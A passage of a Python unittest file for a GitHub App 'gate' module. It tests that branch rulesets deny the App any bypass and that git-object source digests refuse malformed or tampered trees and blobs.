        app.request=request;app.pages=lambda path,*args:(rules if path.endswith('/rules/branches/main') else [{'id':row['id']} for row in sets])
        return app,repo,rules,sets
    def snapshot(self,app,repo):
        with patch.object(gate,'repository_snapshot',return_value=repo):
            return gate.controls_snapshot(app,require_successor_only=True,require_app_non_bypass=True)
    def test_redacted_list_and_never_are_valid_app_specific_evidence(self):
        app,repo,rules,sets=self.fixture();value=self.snapshot(app,repo)
        self.assertEqual(value['app_non_bypass'],{'1':'never'})
        self.assertEqual(value['bypass_visibility'],{'1':'redacted-or-unavailable'})
        self.assertEqual(value['contributing_rulesets'],[1])
        self.assertNotIn('bypass_actors',sets[0],'caller-specific evidence must not invent a hidden list')
    def test_every_missing_unknown_or_capable_status_refuses(self):
        for value in (None,'','always','pull_requests_only','pull_request','exempt','unknown',True,False,0,[],{}):
            app,repo,rules,sets=self.fixture();sets[0]['current_user_can_bypass']=value
            with self.subTest(value=value),self.assertRaisesRegex(gate.Rejected,'App bypass status'):
                self.snapshot(app,repo)
        app,repo,rules,sets=self.fixture();del sets[0]['current_user_can_bypass']
        with self.assertRaisesRegex(gate.Rejected,'App bypass status'):self.snapshot(app,repo)
    def test_incomplete_duplicate_inactive_or_malformed_contributors_refuse(self):
        _,_,rules,sets=self.fixture()
        cases=[([],sets),(rules,[]),(rules,sets+sets),(rules,[dict(sets[0],enforcement='disabled')]),
               (rules+[dict(type='deletion',ruleset_id=2)],sets),
               ([dict(type='deletion')],sets),([dict(type='deletion',ruleset_id=True)],sets),
               (rules,[dict(sets[0],id=True)]),(rules,[dict(sets[0],id='1')]),
               (rules,[dict(sets[0],id=[])]),(rules,[dict(sets[0],id=None)])]
        for observed,details in cases:
            with self.subTest(observed=observed),self.assertRaises(gate.Rejected):
                gate.app_non_bypass(observed,details)
    def test_visible_owner_actor_checks_are_preserved(self):
        app,repo,rules,sets=self.fixture()
        sets[0]['bypass_actors']=[{'actor_id':gate.APP_ID,'actor_type':'Integration','bypass_mode':'always'}]
        with self.assertRaisesRegex(gate.Rejected,'owner bypass exception'):self.snapshot(app,repo)


    def test_current_qualification_reads_app_non_bypass_twice_and_rejects_drift(self):
        app,repo,rules,sets=self.fixture();app.writable=False
        old_pages=app.pages
        app.pages=lambda path,*args: ([{'id':gate.REPOSITORY_ID,'full_name':gate.REPOSITORY}]
            if path=='/installation/repositories' else old_pages(path,*args))
        read=gate.API('fixture-read')
        revision='c'*40
        read.request=lambda path: ({'object':{'sha':revision}} if path.endswith('/git/ref/heads/main') else
            {'id':gate.BOT_ID,'type':'Bot','login':gate.APP_SLUG+'[bot]'} if path.startswith('/users/') else
            {'id':10,'path':'.github/workflows/ci.yml','state':'active'})
        read.pages=lambda *args:[{'id':11,'run_attempt':1,'status':'completed','conclusion':'success',
            'event':'push','head_branch':'main','head_sha':revision,
            'repository':{'id':gate.REPOSITORY_ID},'head_repository':{'id':gate.REPOSITORY_ID}}]
        with patch.object(gate,'repository_snapshot',return_value=repo),patch.object(gate,'validate_ci_jobs'):
            value=gate.qualify_app(read,app,revision,gate.APP_SLUG,'123',stage='current')
        self.assertEqual(value['app_non_bypass'],{'1':'never'})
        self.assertFalse(value['mutated'])
        original=app.request;reads=[]
        def changed(path,method='GET',data=None):
            result=original(path,method,data)
            if '/rulesets/' in path:
                reads.append(path)
                if len(reads)==2:return dict(result,current_user_can_bypass='always')
            return result
        app.request=changed
        with patch.object(gate,'repository_snapshot',return_value=repo),patch.object(gate,'validate_ci_jobs'), \
             self.assertRaisesRegex(gate.Rejected,'App bypass status'):
            gate.qualify_app(read,app,revision,gate.APP_SLUG,'123',stage='current')


class GitObjectSourceTests(unittest.TestCase):
    def test_git_object_digest_matches_checkout_bytes_modes_and_unicode(self):
        import os, subprocess, tempfile
        with tempfile.TemporaryDirectory() as temporary:
            root=Path(temporary).resolve()
            env={'PATH':os.defpath,'HOME':str(root),'LANG':'C','LC_ALL':'C',
                 'GIT_CONFIG_NOSYSTEM':'1','GIT_CONFIG_GLOBAL':'/dev/null'}
            def git(*args):
                return subprocess.check_output(['/usr/bin/git','-C',str(root),*args],env=env,stderr=subprocess.DEVNULL)
            git('init','-q')
            (root/'empty').write_bytes(b'')
            (root/'unicode-é').write_text('fixture bytes')
            (root/'candidate.py').write_text('raise RuntimeError("candidate must never execute")\n')
            (root/'candidate.py').chmod(0o755)
            git('add','.')
            git('-c','user.name=Fixture','-c','user.email=fixture@example.invalid','commit','-qm','fixture')
            revision=git('rev-parse','HEAD').decode().strip();calls=[]
            def command(*args):calls.append(args);return git(*args)
            actual=gate.source_digest_from_objects(command,revision)
            self.assertEqual(actual,gate.ci_module().git_source_digest(root,revision))
            self.assertTrue(all(row[0] in ('ls-tree','cat-file') for row in calls))
            with patch.object(gate,'inspect_git_objects',side_effect=lambda head,base,token,inspect:inspect(command,head)) as isolated:
                self.assertEqual(gate.git_source_at(revision,'fixture'),actual)
            self.assertEqual(isolated.call_args.args[:3],(revision,revision,'fixture'))

    def test_unsafe_tree_or_blob_mismatch_refuses(self):
        data=b'fixture';oid=gate.hashlib.sha1(b'blob 7\0'+data).hexdigest();revision='a'*40
        def inspect(tree,blob=data):
            return gate.source_digest_from_objects(lambda *args:tree if args[0]=='ls-tree' else blob,revision)
        good=('100644 blob '+oid+'\tfixture\0').encode()
        self.assertRegex(inspect(good),'^[0-9a-f]{64}$')
        for tree in (b'', good[:-1],good+good,
                     good.replace(b'100644',b'120000'),good.replace(b'100644 blob',b'160000 commit'),
                     good.replace(b'\tfixture',b'\t../fixture'),good.replace(b'\tfixture',b'\t/fixture'),
                     good.replace(b'\tfixture',b'\tbad\\name')):
            with self.subTest(tree=tree),self.assertRaises((gate.Rejected,ValueError)):
                inspect(tree)
        with self.assertRaisesRegex(gate.Rejected,'source Git object mismatch'):
            inspect(good,b'tampered')
